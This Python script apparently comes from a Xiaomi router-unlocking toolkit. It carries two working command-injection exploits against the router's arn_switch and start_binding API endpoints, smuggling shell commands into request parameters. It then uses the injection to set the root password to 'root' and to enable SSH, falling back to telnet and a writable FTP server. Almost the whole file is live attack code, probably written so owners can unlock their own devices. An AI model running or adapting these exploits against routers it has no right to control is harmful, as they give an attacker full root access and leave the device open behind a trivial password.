#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import requests

import xmir_base
from gateway import *


try:
    gw = inited_gw
except NameError:
    gw = create_gateway(die_if_sshOk = False)


def exploit_1(cmd, api = 'API/misystem/arn_switch'):
    # vuln/exploit author: ?????????
    cmd = cmd.replace(';', '\n')
    params = { 'open': 1, 'mode': 1, 'level': "\n" + cmd + "\n" }
    res = gw.api_request(api, params, resp = 'text')
    time.sleep(0.5)
    return res

def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
    # vuln/exploit author: ?????????
    cmd = cmd.replace(';', '\n')
    params = { 'uid': 1234, 'key': "1234' -X \n" + cmd + "\n logger -t X 'X" }
    try:
        res = gw.api_request(api, params, resp = 'text', timeout = 1.5)
    except requests.exceptions.ReadTimeout:
        res = ''
    return res


# set default value for iperf_test_thr
gw.set_diag_iperf_test_thr(20)

vuln_test_num = 82000011
exec_cmd = None
exp_list = [ exploit_2, exploit_1 ]
for idx, exp_func in enumerate(exp_list):
    exp_test_num = vuln_test_num + idx
    res = exp_func(f"uci set diag.config.iperf_test_thr={exp_test_num} ; uci commit diag")
    #if '"code":0' not in res:
    #    continue
    iperf_test_thr = gw.get_diag_iperf_test_thr()
    if iperf_test_thr == str(exp_test_num):
        exec_cmd = exp_func
        break
    time.sleep(0.5)

# set default value for iperf_test_thr
gw.set_diag_iperf_test_thr(20)

if not exec_cmd:
    raise ExploitNotWorked('Exploits arn_switch/start_binding not working!!!')

if exec_cmd == exploit_1:
    print('Exploit "arn_switch" detected!') 

if exec_cmd == exploit_2:
    print('Exploit "start_binding" detected!') 


exec_cmd(r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
exec_cmd(r"nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit")
exec_cmd(r"echo -e 'root\nroot' > /tmp/psw.txt ; passwd root < /tmp/psw.txt")
exec_cmd(r"/etc/init.d/dropbear enable")

print('Run SSH server on port 22 ...')
exec_cmd(r"/etc/init.d/dropbear restart")
exec_cmd(r"logger -t XMiR ___completed___")

time.sleep(0.5)
gw.use_ssh = True
gw.passw = 'root'
ssh_en = gw.ping(verbose = 0, contimeout = 11)   # RSA host key generate slowly!
if ssh_en:
    print('#### SSH server are activated! ####')
else:
    print(f"WARNING: SSH server not responding (IP: {gw.ip_addr})")

if not ssh_en:
    print("")
    print('Unlock TelNet server ...')
    exec_cmd("bdata set telnet_en=1 ; bdata commit")
    print('Run TelNet server on port 23 ...')
    exec_cmd("/etc/init.d/telnet enable ; /etc/init.d/telnet restart")
    time.sleep(0.5)
    gw.use_ssh = False
    telnet_en = gw.ping(verbose = 2)
    if not telnet_en:
        print(f"ERROR: TelNet server not responding (IP: {gw.ip_addr})")
        sys.exit(1)
    print("")
    print('#### TelNet server are activated! ####')
    #print("")
    #print('Run FTP server on port 21 ...')
    gw.run_cmd(r"rm -f /etc/inetd.conf")
    gw.run_cmd(r"sed -i 's/\\tftpd\\t/\\tftpd -w\\t/g' /etc/init.d/inetd")
    gw.run_cmd('/etc/init.d/inetd enable')
    gw.run_cmd('/etc/init.d/inetd restart')
    gw.use_ftp = True
    ftp_en = gw.ping(verbose = 0)
    if ftp_en:
        print('#### FTP server are activated! ####')
    else:
        print(f"WARNING: FTP server not responding (IP: {gw.ip_addr})")

if ssh_en or telnet_en:
    gw.run_cmd('nvram set uart_en=1; nvram set boot_wait=on; nvram commit')
    gw.run_cmd('nvram set bootdelay=3; nvram set bootmenu_delay=5; nvram commit')

